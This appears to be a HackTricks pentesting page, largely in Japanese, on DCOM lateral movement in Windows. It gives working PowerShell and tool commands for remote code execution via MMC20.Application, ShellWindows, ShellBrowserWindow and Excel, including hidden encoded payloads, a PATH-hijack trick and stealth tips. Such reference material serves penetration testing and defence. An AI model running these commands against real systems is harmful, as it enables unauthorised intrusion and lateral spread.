# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM lateral movement は、service や scheduled task を作成する代わりに、RPC/DCOM 経由で公開されている既存の COM server を再利用できるため魅力的です。実際には、初期接続は通常 TCP/135 から開始され、その後、動的に割り当てられた高位 RPC port へ移行します。

## 前提条件と注意点

- 通常、target 上で local administrator context が必要であり、remote COM server が remote launch/activation を許可している必要があります。
- **2023年3月14日**以降、Microsoft はサポート対象システムで DCOM hardening を適用しています。低い activation authentication level を要求する古い client は、少なくとも `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY` 以上で negotiate できない場合、失敗する可能性があります。Modern Windows client は通常、自動的に引き上げられるため、現在の tooling は通常そのまま動作します。<sup>[[3]](#references)</sup>
- Manual または scripted DCOM execution には、通常 TCP/135 に加えて target の dynamic RPC port range が必要です。Impacket の `dcomexec.py` を使用し、command output を返したい場合は、通常 `ADMIN$`（または別の writable/readable share）への SMB access も必要です。
- RPC/DCOM は動作するものの SMB が block されている場合でも、`dcomexec.py -nooutput` は blind execution に役立ちます。

簡易チェック:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

**この technique の詳細については、[https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/) の original post を参照してください。**<sup>[[1]](#references)</sup>

Distributed Component Object Model (DCOM) オブジェクトは、ネットワークベースでオブジェクトとやり取りするための興味深い機能を提供します。Microsoft は DCOM と Component Object Model (COM) の両方について包括的なドキュメントを提供しており、[DCOM はこちら](https://msdn.microsoft.com/en-us/library/cc226801.aspx)、[COM はこちら](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>)からアクセスできます。PowerShell コマンドを使用すると、DCOM アプリケーションの一覧を取得できます。
```bash
Get-CimInstance Win32_DCOMApplication
```
COM オブジェクトである [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx) を使用すると、MMC snap-in の操作をスクリプト化できます。特に、このオブジェクトには `Document.ActiveView` 配下に `ExecuteShellCommand` メソッドが含まれています。このメソッドの詳細については[こちら](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>)を参照してください。次のコマンドを実行して確認できます:<sup>[[6]](#references)</sup>

この機能により、DCOM application を介してネットワーク越しにコマンドを実行できます。admin としてリモートで DCOM とやり取りするには、次のように PowerShell を利用できます:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
このコマンドは DCOM application に接続し、COM object のインスタンスを返します。その後、ExecuteShellCommand method を呼び出して remote host 上で process を実行できます。process には次の手順が含まれます。

メソッドを確認:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
RCEを取得:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
最後の引数はウィンドウスタイルです。`7` にするとウィンドウは最小化されたままになります。運用上、MMCベースの実行では通常、リモートの `mmc.exe` プロセスが payload を spawn します。これは、以下の Explorer-backed オブジェクトとは異なります。

## ShellWindows & ShellBrowserWindow

**この technique の詳細については、元の投稿 [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

**MMC20.Application** オブジェクトには明示的な "LaunchPermissions" がなく、Administrators に access を許可する permissions がデフォルトで設定されていることが確認されました。詳細については[こちら](https://twitter.com/tiraniddo/status/817532039771525120)の thread を参照できます。また、明示的な Launch Permission が設定されていないオブジェクトを filter するため、[@tiraniddo](https://twitter.com/tiraniddo) の OleView .NET を使用することが推奨されます。

`ShellBrowserWindow` と `ShellWindows` という2つの特定のオブジェクトは、明示的な Launch Permissions がないため注目されました。`HKCR:\AppID\{guid}` 配下に `LaunchPermission` registry entry が存在しないことは、明示的な permissions がないことを意味します。

`MMC20.Application` と比較すると、これらのオブジェクトは、リモート host 上で command が `mmc.exe` ではなく `explorer.exe` の child として実行されることが多いため、OPSEC の観点ではより目立ちにくい傾向があります。

### ShellWindows

ProgID を持たない `ShellWindows` では、.NET の methods である `Type.GetTypeFromCLSID` と `Activator.CreateInstance` により、AppID を使用して object を instantiate できます。この process では OleView .NET を利用して `ShellWindows` の CLSID を取得します。instantiate 後は、`WindowsShell.Item` method を通じて interaction でき、`Document.Application.ShellExecute` のような method invocation が可能になります。

object を instantiate し、リモートで commands を実行する PowerShell commands の例が示されています。
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow` は類似していますが、CLSID を介して直接インスタンス化し、`Document.Application.ShellExecute` へピボットできます:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Excel DCOM Objectsを使用したLateral Movement

DCOM Excel objectsを悪用することで、Lateral movementを実現できます。詳細については、[Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)にある、DCOM経由のLateral movementでExcel DDEを活用する方法に関する解説を読むことをお勧めします。<sup>[[5]](#references)</sup>

Empire projectには、DCOM objectsを操作してExcelをremote code execution (RCE)に利用する方法を示したPowerShell scriptが用意されています。以下は、[Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1)で公開されているscriptの抜粋で、ExcelをRCEに悪用するさまざまな方法を紹介しています：
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
最近の研究では、`Excel.Application` の `ActivateMicrosoftApp()` メソッドによって、この領域がさらに拡張されました。重要な点は、Excel がシステムの `PATH` を検索して、FoxPro、Schedule Plus、Project などのレガシーな Microsoft アプリケーションの起動を試みることです。攻撃者が、これらの想定される名前のいずれかを持つ payload を、対象の `PATH` に含まれる書き込み可能な場所に配置できれば、Excel にそれを実行させることができます。<sup>[[4]](#references)</sup>

このバリエーションの要件：

- 対象の Local admin
- 対象に Excel がインストールされていること
- 対象の `PATH` 内にある書き込み可能なディレクトリへ payload を書き込めること

FoxPro の lookup（`FOXPROW.exe`）を悪用する実践例：
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
攻撃ホストにローカルの `Excel.Application` ProgID が登録されていない場合は、代わりに CLSID を使用してリモートオブジェクトをインスタンス化します:
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
実際の攻撃で悪用されている値:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### Lateral Movement用のAutomation Tools

これらのtechniqueを自動化するために、2つのtoolが紹介されています:

- **Invoke-DCOM.ps1**: Empire projectが提供するPowerShell scriptで、remote machine上でcodeを実行するためのさまざまなmethodの呼び出しを簡略化します。このscriptはEmpire GitHub repositoryから入手できます。

- **SharpLateral**: remoteでcodeを実行するために設計されたtoolで、次のcommandで使用できます:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Automatic Tools

- Powershell script [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) を使用すると、コメントで示されているすべての方法を簡単に呼び出して、他のマシン上で code を実行できます。
- Impacket の `dcomexec.py` を使用すると、DCOM 経由でリモートシステム上のコマンドを実行できます。現在のビルドでは `ShellWindows`、`ShellBrowserWindow`、`MMC20` がサポートされており、デフォルトは `ShellWindows` です。
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- [**SharpLateral**](https://github.com/mertdas/SharpLateral)も使用できます。
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [**SharpMove**](https://github.com/0xthirteen/SharpMove) も使用できます。
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## 参考資料

- [1] [MMC20.Application COM Objectを使用したLateral Movement](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [DCOM経由のLateral Movement: Round 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442—Windows DCOM Server Security Feature Bypass (CVE-2021-26414)の変更管理](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Lateral Movement: DCOM Excel ApplicationのPowerを悪用する](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [DCOM経由のLateral MovementのためにExcel DDEを活用する](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com - MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)

{{#include ../../banners/hacktricks-training.md}}
